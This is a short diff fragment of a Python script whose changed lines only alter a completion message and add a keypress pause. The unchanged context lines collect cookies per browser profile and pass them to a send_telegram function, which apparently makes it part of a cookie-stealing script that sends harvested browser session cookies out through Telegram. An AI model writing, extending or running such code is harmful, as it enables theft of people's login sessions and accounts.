@@ -98,4 +98,5 @@ if __name__ == "__main__":
             profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
-    print("Script completed.")
+    print("Script completed. Press any key to exit...")
+    input()
